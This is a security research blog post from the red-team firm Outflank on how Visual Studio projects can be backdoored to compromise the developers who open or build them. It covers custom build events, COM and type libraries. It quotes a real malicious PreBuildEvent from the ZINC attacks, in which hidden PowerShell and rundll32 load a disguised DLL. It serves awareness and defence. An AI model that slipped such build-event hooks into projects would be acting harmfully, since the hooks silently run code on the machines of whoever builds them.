---
title: Attacking Visual Studio for Initial Access
url: https://outflank.nl/blog/2023/03/28/attacking-visual-studio-for-initial-access/
source: Publications | Outflank
date: 2023-03-29
fetch_date: 2025-10-04T10:59:08.709579
---

# Attacking Visual Studio for Initial Access

[Skip to the content](#content)

[logo](https://www.outflank.nl)
Experts in red teaming

* [Red Team Tools](/products/)
  + [Outflank Security Tooling](/products/outflank-security-tooling/)
    - [Outflank C2](https://www.outflank.nl/products/outflank-security-tooling/outflank-c2/)
    - [Payload Generator](/products/outflank-security-tooling/pe-payload-generator/)
    - [Tooling](/products/outflank-security-tooling/ost-tool-list/)
    - [Tradecraft](/products/outflank-security-tooling/tradecraft/)
    - [Demo Videos](/videos/ost-demo-videos/)
  + [Cobalt Strike](/products/cobalt-strike/)
  + [Red Team Bundle](/datasheets/red-team-bundle/)
  + [Advanced Red Team Bundle](/datasheets/advanced-red-team-bundle/)
* [Red Team Services](/services/red-teaming/)
* Blog & Resources
  + [Outflank Blog](/blog/)
  + [Community](/products/outflank-security-tooling/ost-community/)
  + [Datasheets](/datasheets/)
  + [OST Demo Videos](/videos/ost-demo-videos/)
  + [OST Releases](/services/outflank-security-tooling/releases/)
  + [Upcoming Events](https://www.outflank.nl/upcoming-events/)
* [About Us](/company/)
  + [Our Company](/company/)
  + [OST Testimonials](/company/outflank-security-tooling-testimonials/)
  + [Contact Us](/contact/)
* [Schedule a Demo](/demo-request/)
* [REQUEST QUOTEREQUEST QUOTE](/request-a-quote/)

# Publications

# [Attacking Visual Studio for Initial Access](https://www.outflank.nl/blog/2023/03/28/attacking-visual-studio-for-initial-access/ "Attacking Visual Studio for Initial Access")

[Stan](https://www.outflank.nl/blog/author/stan/ "Posts by Stan")
 |
March 28, 2023

In this blog post we will demonstrate how compiling, reverse engineering or even just viewing source code can lead to compromise of a developer’s workstation. This research is especially relevant in the context of attacks on security researchers using backdoored Visual Studio projects allegedly by North Korean actors, [as exposed by Google](https://blog.google/threat-analysis-group/new-campaign-targeting-security-researchers). We will show that these in-the-wild attacks are only the tip of the iceberg and that backdoors can be hidden via much stealthier vectors in Visual Studio projects.

This post will be a journey into COM, type libraries and the inner workings of Visual Studio. In particular, it serves the following goals:

* Exploring Visual Studio’s attack surface for initial access attacks from a red teamer’s perspective.
* Raising awareness on the dangers of working with untrusted code, which we as hackers and security researchers do on a regular basis.
* Demonstrating COM attack primitives using type libraries that can also be used for attacking other software than Visual Studio.

This blog post is mostly a write-up of my presentation at Nullcon Goa 2020. Slides can be found [here](https://github.com/outflanknl/Presentations/blob/master/Nullcon2020_COM-promise_-_Attacking_Windows_development_environments.pdf), a video recording is available [here](https://www.youtube.com/watch?v=1cgBv8X-oNw).

### A curious warning message

This research was triggered some years ago by a warning message that I often encounter when I open a downloaded Visual Studio project:

[![](https://outflank.nl/wp-content/uploads/2023/03/visual_studio_warning-1024x357.png)](https://outflank.nl/wp-content/uploads/2023/03/visual_studio_warning.png)

How often have you seen this message (and perhaps ignored it..) after downloading a cool new tool from a random author that you found on Twitter?

The warning message tells me that this project file “may have come from a location that is not fully trusted” and “could present a security risk by executing custom build steps”. I understood the first part – the code repository is downloaded from GitHub in this case, but I didn’t fully understand the implications of this “security risk” that was referred to.

By now I understand that just opening (not compiling!) a specially crafted Visual Studio project file can get you compromised. Let’s find out how.

### Abuse in the wild: custom build events

Based on my analysis of various in-the-wild samples, I come to the conclusion that abuse of custom build events is by far the most popular method to create backdoored Visual Studio projects. Build events are a legitimate feature of Visual Studio and are well documented [here](https://learn.microsoft.com/en-us/cpp/build/how-to-use-build-events-in-msbuild-projects?view=msvc-170). As the name implies, these build events trigger upon building/compilation of code. For example, the following excerpt from a Visual Studio project file was used in a [2021 series of targeted attacks on security researchers by ZINC](https://www.microsoft.com/en-us/security/blog/2021/01/28/zinc-attacks-against-security-researchers/), allegedly tied to DPRK (North Korea).

```
<PreBuildEvent>
  <Command>
    powershell -executionpolicy bypass -windowstyle hidden if(([system.environment]::osversion.version.major -eq 10) -and [system.environment]::is64bitoperatingsystem -and (Test-Path x64\Debug\Browse.VC.db)){rundll32 x64\Debug\Browse.VC.db,ENGINE_get_RAND 7am1cKZAEb9Nl1pL 4201 }
  </Command>
</PreBuildEvent>
```

Although Microsoft described this technique as *“This use of a malicious pre-build event is an innovative technique to gain execution”*, there are much more stealthy ways to hide a backdoor in code or a Visual Studio project file. Let’s enter the mysterious realm of type libraries.

### COM, Type Libraries and the #import directive

C++ code can make use of the #import preprocessor directive. Note that this is something completely different from the #include directive. The latter is for including header files, while #import is used to reference a so-called type library.

[![](https://outflank.nl/wp-content/uploads/2023/03/import_directive-1024x410.png)](https://outflank.nl/wp-content/uploads/2023/03/import_directive.png)

Type libraries are a mechanism to describe interfaces in the [Component Object Model](https://en.wikipedia.org/wiki/Component_Object_Model) (COM). If you are not too familiar with COM, the essence here is that an interface defines a set of methods that an object can support. Interfaces are implemented as virtual tables, which are basically an array of function pointers. An example is graphically represented below.

[![](https://outflank.nl/wp-content/uploads/2023/03/com_vtable-1024x371.png)](https://outflank.nl/wp-content/uploads/2023/03/com_vtable.png)

So how does a COM client know what an interface looks like? The most common methods to achieve this are:

* **IDispatch interface** (“late binding”)
  Dispatch is an interface that may be implemented by COM server objects so that COM client programs can call its methods dynamically at run-time, as opposed to at compile time where all the methods and argument types need to be known ahead of time. This is how scripting languages such as PowerShell and JScript deal with interfaces in COM. It should be noted that this has significant overhead and performance penalties.
* **Interface definitions** (“early binding”)
  COM interfaces can be defined in C++ using abstract classes and pure virtual functions (which can be compiled to vtables). But how can other programming languages know about an interface at compile time? Microsoft’s solution to this problem is **Type Libraries**, a proprietary file format which allows “early binding”.

### What are type libraries?

Type libraries are a Microsoft proprietary binary file format. The normal procedure to create a type library is to compile Interface Definition Language (IDL) into binary format using the MIDL compiler. Type libraries can be stored in separate files (.tlb) or be embedded as resources in executables (.exe, .dll).

Below is an example interface in IDL that can be compiled into a type library. This example was taken from the Inside COM+ book (recommended read!), [which is available online](https://thrysoee.dk/InsideCOM%2B/) including a [detailed chapter on type libr...